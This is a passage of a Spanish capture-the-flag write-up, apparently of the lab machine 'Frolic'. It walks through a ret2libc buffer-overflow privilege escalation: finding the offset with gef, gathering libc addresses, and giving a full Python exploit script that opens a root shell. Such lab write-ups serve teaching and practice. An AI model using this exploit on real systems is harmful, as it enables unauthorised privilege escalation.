96 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
Reading symbols from rop...
(No debugging symbols found in rop)
gef➤  checksec
[+] checksec for '/home/z3r0byte/Descargas/rop'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Bien, tras ejecutar `checksec` me doy cuenta de que el binario tiene el [NX](https://es.wikipedia.org/wiki/Prevenci%C3%B3n_de_ejecuci%C3%B3n_de_datos){:target="\_blank"}{:rel="noopener nofollow"} habilitado.

Esto es una característica de seguridad implementada a la hora de compilar el binario que hace que no se sea posible ejecutar [shellcodes](https://www.netinbag.com/es/internet/what-is-a-shellcode.html){:target="\_blank"}{:rel="noopener nofollow"} almacenados en la pila.

Al ver esto, pienso en que podríamos aprovecharnos de una técnica llamada [Ret2libc](https://www.hackplayers.com/2021/01/taller-de-exploiting-ret2libc-en-linux-x64.html){:target="\_blank"}{:rel="noopener nofollow"}, esto consiste en ejecutar código que no se encuentra en la pila sino en un sector de la memoria de libc, que es una librería que contiene funciones de C como system(), exit(), etc.

Con esto podríamos _bypassear_ la protección que tiene el binario.

Pero hay una gran duda, ¿Cómo hacemos esto?.

### 1º paso: Encontrar el offset

¿Que es el offset? El offset el la cantidad de caracteres que se deben enviar antes de sobreescribir el `EIP`, que es el registro que dice a donde va el flujo de ejecución del programa.

![image](https://user-images.githubusercontent.com/67548295/134777657-d46dabcb-3b1e-4632-89a9-b2e4423329d9.png)

Yo no sé cuantas carácteres tengo que introducir para llegar al EIP, eso lo podemos averiguar con la función `pattern create` y `pattern offset` de la utilidad `gef`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $gdb rop

GEF for linux ready, type `gef' to start, `gef config' to configure
96 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
Reading symbols from rop...
(No debugging symbols found in rop)

gef➤  pattern create 75

[+] Generating a pattern of 75 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaa
[+] Saved as '$_gef0'
gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaa
Starting program: /home/z3r0byte/Descargas/rop aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaa

Program received signal SIGSEGV, Segmentation fault.
0x6161616e in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x4b      
$ebx   : 0xffffd0b0  →  0x00000002
$ecx   : 0x0       
$edx   : 0x0       
$esp   : 0xffffd080  →  "oaaapaaaqaaaraaasaa"
$ebp   : 0x6161616d ("maaa"?)
$esi   : 0xf7f9f000  →  0x001e4d6c
$edi   : 0xf7f9f000  →  0x001e4d6c
$eip   : 0x6161616e ("naaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
───────────────────────────────────────────────────────────────────────────── stack ────
0xffffd080│+0x0000: "oaaapaaaqaaaraaasaa"	 ← $esp
0xffffd084│+0x0004: "paaaqaaaraaasaa"
0xffffd088│+0x0008: "qaaaraaasaa"
0xffffd08c│+0x000c: "raaasaa"
0xffffd090│+0x0010: 0x00616173 ("saa"?)
0xffffd094│+0x0014: 0x00000000
0xffffd098│+0x0018: 0x00000000
0xffffd09c│+0x001c: 0xf7dd8e46  →  <__libc_start_main+262> add esp, 0x10
─────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616e
─────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "rop", stopped 0x6161616e in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip

[+] Searching for '$eip'
[+] Found at offset 52 (little-endian search) likely
[+] Found at offset 49 (big-endian search)
```

Bien, lo que hemos hecho ha sido generar una cadena especial con `pattern create` para pasarsela al programa, cuando el programa corrompió, usamos la utilidad `pattern offset` para que cogiera el valor del `EIP` (que era 'naaa') y lo buscara en la cadena de texto que habíamos generado, una vez encontrado, contaría los carácteres hasta llegar a esa parte de la cadena.

Ahora sabemos que el offset es de 52, es decir, hay que introducir 52 caracteres para que lo que introduzcamos luego entre en el registro `EIP`.

### 2º paso: Recolecta de direcciones de memoria

El segundo paso consiste en ir recolectando las direcciones de memoria que hacen falta para hacer el `ret2libc`.

La estructura de un buen ret2libc es así: `ret2libc = system_addr + exit_addr + bin_sh_addr`

Necesitamos las direcciones de memoria de `system, exit y /bin/sh` a parte de la direccion base de `libc`

Antes de todo, hay que verificar si el [ASLR](https://es.wikipedia.org/wiki/Aleatoriedad_en_la_disposici%C3%B3n_del_espacio_de_direcciones){:target="\_blank"}{:rel="noopener nofollow"} está activado en la máquina víctima:

```
www-data@frolic:/dev/shm$ cat /proc/sys/kernel/randomize_va_space 
0
```
> Si el valor es `0`: No hay aleatoriedad. Todo es estático.
> 
> Si el valor es `1`: Aleatorización parcial.
> 
> Si el valor es `2`: Aleatorización completa. Todo está aleatorizado.

En este caso el valor es `0` lo que quiere decir esto es que las direcciones de memoria son estáticas y no cambian. Esto nos ayudará.

Ahora recolectemos las direcciones de memoria que necesitamos:

###### Libc addr

```bash
www-data@frolic:~$ ldd /home/ayush/.binary/rop
	[...]
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
	[...]
```
libc = `0xb7e19000`

###### system addr

```bash
www-data@frolic:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system@@"
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```
system addr = 0x0003ada0

###### exit addr

```bash
www-data@frolic:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit@@"
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
```
exit addr = 0x0002e9d0

###### /bin/sh addr

```bash
www-data@frolic:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
 15ba0b /bin/sh
```
/bin/sh addr = 0x0015ba0b

###### Nota

Todas estas direcciones son el offset de las instrucciones, luego hay que sumar estas direcciones a la direccion base de libc para obtener la dirección real de cada instrucción.

### 3º paso: desarrollar script

Ahora con toda esta información ya podremos hacer el script.

###### Script explicado

```python

#!/usr/bin/python

from struct import pack # importamos librerias para hacer más facil la conversión a little endian
from subprocess import call # instrucción call para llamar al binario con el argumento

offset = 52 # declaramos offset

junk = "A"*offset # caracteres hasta llegar al EIP

# ret2libc = system_addr + exit_addr + bin_sh_addr

libc = 0xb7e19000 # Dirección base libc

system_addr_off = 0x0003ada0 # offset de la direccion de system
exit_addr_off = 0x0002e9d0 # offset de la direccion de exit
bin_sh_addr_off = 0x0015ba0b # offset de la dirección de bin/sh

system_addr = pack("<I", libc + system_addr_off) # Sumamos el offset de system a la direccion base de libc y obtenemos la direccion real.
exit_addr = pack("<I", libc + exit_addr_off) # Sumamos el offset de exit a la dirección base de libc y obtenemos la direccion real.
bin_sh_addr = pack("<I", libc + bin_sh_addr_off) # Sumamos el offset de bin_sh a la dirección base de libc y obtenemos la direccion real.

payload = junk + system_addr + exit_addr + bin_sh_addr # creamos el payload que le pasaremos como argumento al programa.

call(["/home/ayush/.binary/rop", payload]) # Llamamos al programa vulnerable pasandole como argumento el payload que generamos
```
Listo, ya solo quedaría ejecutar el script.

### 4º paso: Explotación

Ejecutamos el script para ver si funciona:

```bash
www-data@frolic:/dev/shm$ python exploit.py 
# whoami; id
root
uid=0(root) gid=33(www-data) groups=33(www-data)
```

¡¡¡Ha funcionado!!!

Ahora solo quedaría obtener la flag `root.txt` que se encuentra en `/root/root.txt`:

```bash
# cat /root/root.txt
8XXXXXXXXXXXXXXXXXXXXXXXXXXXX2
```

# Resumen

En esta máquina hemos explotado varias cosas para la intrusión, en primer lugar nos aprovechamos de un **panel de inicio de sesión** mal implementado que tenía las **credenciales expuestas** en un archivo a nuestra disposición.
Después de un largo puzzle de **criptografía**, abusamos de un software con una vulnerabilidad de `csv injection` con la cual accedimos al sistema.
Para escalar privilegios explotamos un **ret2libc**, una tecnica de **buffer overflow** para _bypassear_ el `data execution prevention`.
